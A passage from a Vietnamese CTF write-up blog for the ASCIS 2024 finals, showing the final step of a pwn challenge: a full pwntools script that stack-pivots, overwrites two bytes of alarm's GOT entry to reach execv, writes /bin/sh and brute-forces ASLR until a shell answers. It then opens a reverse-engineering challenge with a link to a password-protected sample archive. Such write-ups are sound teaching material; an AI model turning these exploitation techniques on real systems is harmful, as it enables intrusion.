<p><strong>2. Write <code>/bin/sh\x00</code> and seup [RSI] = 0</strong></p>
<p>Công việc cuối cùng là viết <code>/bin/sh\x00</code>, setup cho RSI = 0 và xây ROP chain để gọi <code>execv</code>. Memory layout được mình thiết kế như sau</p>
<img src=./imgs/4.png>
<p>Payload hoạt động nhưng phải bật option NOASLR. Quay lại vấn đề bruteforce, mình sẽ bỏ script trong vòng <code>While</code> để liên tục bruteforce đến khi nào có đúng địa chỉ <code>execv</code>.</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>import</span> <span class=nn>time</span>

<span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./chall_patched&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
<span class=n>ld</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./ld-linux-x86-64.so.2&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>

<span class=n>context</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;cmd.exe /c start wsl&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(),</span> <span class=n>binary</span><span class=o>=</span><span class=n>exe</span><span class=p>)</span>

<span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
    <span class=k>def</span> <span class=nf>GDB</span><span class=p>():</span> 
        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=s1>&#39;&#39;&#39;
</span><span class=s1>            b *0x401261
</span><span class=s1>            continue
</span><span class=s1>        &#39;&#39;&#39;</span><span class=p>)</span>

        <span class=n>pause</span><span class=p>()</span>

    <span class=c1># GDB()</span>

    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>   

    <span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x401247</span>
    <span class=n>pop_rbp</span> <span class=o>=</span> <span class=mh>0x40119d</span>
    <span class=n>ret</span> <span class=o>=</span> <span class=mh>0x40101a</span>
    <span class=n>alarm_got</span> <span class=o>=</span> <span class=mh>0x404020</span>

    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
        <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mh>0x20</span><span class=p>,</span> 
        <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0x40</span><span class=p>,</span> 
        <span class=mh>0x401249</span>
    <span class=p>)</span>

    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;input 1: stack pivot&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
        <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>,</span> 
        <span class=mh>0x401249</span><span class=p>,</span>
        <span class=sa>b</span><span class=s1>&#39;B&#39;</span> <span class=o>*</span> <span class=mh>0x10</span><span class=p>,</span>
        <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>,</span> 
        <span class=mh>0x401249</span>
    <span class=p>)</span>

    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;input 2: stack pivot new area&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;input 3: change 2 bytes&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xc0\x41</span><span class=s1>&#39;</span><span class=p>)</span>

    <span class=c1># payload = flat(</span>
    <span class=c1>#     b&#39;/bin/sh\x00&#39;, </span>
    <span class=c1>#     pop_rdi, </span>
    <span class=c1>#     alarm_got + 0xe0, </span>
    <span class=c1>#     exe.plt[&#39;alarm&#39;],</span>
    <span class=c1>#     alarm_got + 0xe0, </span>
    <span class=c1>#     0x401249</span>
    <span class=c1># )</span>

    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
        <span class=mi>0</span><span class=p>,</span>
        <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span>
        <span class=sa>b</span><span class=s1>&#39;C&#39;</span> <span class=o>*</span> <span class=mh>0x10</span><span class=p>,</span> 
        <span class=mh>0xdeedbeef</span><span class=p>,</span> 
        <span class=n>pop_rdi</span><span class=p>,</span> 
        <span class=n>alarm_got</span> <span class=o>+</span> <span class=mh>0xe8</span><span class=p>,</span> 
        <span class=n>exe</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;alarm&#39;</span><span class=p>]</span>
    <span class=p>)</span>

    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;input 4: write /bin/sh&#39;</span><span class=p>)</span>
    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>

    <span class=k>try</span><span class=p>:</span>
        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
        <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;input 5: getshell&#39;</span><span class=p>)</span>
        <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>

        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;echo PWNED&#39;</span><span class=p>)</span>
        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;PWNED&#39;</span><span class=p>)</span>
        
        <span class=k>break</span>
    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>

<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id=revtrust-me>rev/Trust Me!</h2>
<img src=./imgs/5.png width=500px/>
<div class="details admonition note open">
<div class="details-summary admonition-title">
<i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Information<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i>
</div>
<div class=details-content>
<div class=admonition-content><ul>
<li><strong>Given files:</strong> <a href="https://drive.google.com/file/d/16cexQLpgva7Z3Gq0xdLPF-7fg3J1FT8k/view?usp=sharing" target=_blank rel="noopener noreffer">TRUSTME.rar</a> (password: <strong>infected</strong>).</li>
</ul>
</div>
</div>
</div></div><div class=post-footer id=post-footer>
<div class=post-info>
<div class=post-info-line>
<div class=post-info-mod>
<span>Updated on 2024-10-19</span>
</div></div>
<div class=post-info-line>
<div class=post-info-md><span>
<a class=link-to-markdown href=/2024-finalascis/index.md target=_blank>Read Markdown</a>
</span></div>
<div class=post-info-share>
<span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://ducdatdau.github.io/2024-finalascis/ data-title="Sinh viên với An toàn Thông tin 2024" data-hashtags=Reverse-Engineering,Pwnable,ASCIS,2024><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://ducdatdau.github.io/2024-finalascis/ data-hashtag=Reverse-Engineering><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://ducdatdau.github.io/2024-finalascis/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a></span>
</div>
</div>
</div>
<div class=post-info-more>
<section class=post-tags><a class="tag-badge tag-reverse" href=/tags/reverse-engineering/ title=Reverse-Engineering><span class=tag-icon aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-1 h-4 w-4"><path d="M19.439 7.85c-.049.322.059.648.289.878l1.568 1.568c.47.47.706 1.087.706 1.704s-.235 1.233-.706 1.704l-1.611 1.611a.98.98.0 01-.837.276c-.47-.07-.802-.48-.968-.925a2.501 2.501.0 10-3.214 3.214c.446.166.855.497.925.968a.979.979.0 01-.276.837l-1.61 1.61A2.404 2.404.0 0112 22.002a2.402 2.402.0 01-1.704-.706l-1.568-1.568a1.026 1.026.0 00-.877-.29c-.493.074-.84.504-1.02.968a2.5 2.5.0 11-3.237-3.237c.464-.18.894-.527.967-1.02a1.026 1.026.0 00-.289-.877l-1.568-1.568A2.402 2.402.0 011.998 12c0-.617.236-1.234.706-1.704L4.23 8.77c.24-.24.581-.353.917-.303.515.077.877.528 1.073 1.01a2.5 2.5.0 103.259-3.259c-.482-.196-.933-.558-1.01-1.073-.05-.336.062-.676.303-.917l1.525-1.525A2.402 2.402.0 0112 1.998c.617.0 1.234.236 1.704.706l1.568 1.568c.23.23.556.338.877.29.493-.074.84-.504 1.02-.968a2.5 2.5.0 113.237 3.237c-.464.18-.894.527-.967 1.02z"/></svg></span><span class=tag-text>Reverse-Engineering</span></a>
<a class="tag-badge tag-pwn" href=/tags/pwnable/ title=Pwnable><span class=tag-icon aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m14 13-7.5 7.5c-.83.83-2.17.83-3 0a2.12 2.12.0 010-3L11 10"/><path d="m16 16 6-6"/><path d="m8 8 6-6"/><path d="m9 7 8 8"/><path d="m21 11-8-8"/></svg></span><span class=tag-text>Pwnable</span></a>
<a class="tag-badge tag-default" href=/tags/ascis/ title=ASCIS><span class=tag-icon aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-1 h-4 w-4"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
</span><span class=tag-text>ASCIS</span></a>
<a class="tag-badge tag-default tag-year" href=/tags/2024/ title=2024><span class=tag-text>2024</span></a>
</section>
<section>
<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
</section>
</div>
<div class=post-nav><a href=/2024-kcsc-recruitment/ class=prev rel=prev title="KCSC Recruitment 2024"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>KCSC Recruitment 2024</a>
<a href=/2024-isitdtu-quals/ class=next rel=next title="ISITDTU Quals 2024">ISITDTU Quals 2024<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div>
</div>
</article></div>
</main><footer class=footer>
<div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2024 - 2025</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://ducdatdau.github.io/ target=_blank>ducdatdau</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
</div>
</footer></div>
<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
<i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments">
<i class="fas fa-comment fa-fw" aria-hidden=true></i>
</a>
</div><link rel=stylesheet href=/lib/lightgallery/css/lightgallery-bundle.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/contrib/auto-render.min.js></script><script type=text/javascript src=/lib/katex/contrib/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0,math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
</html>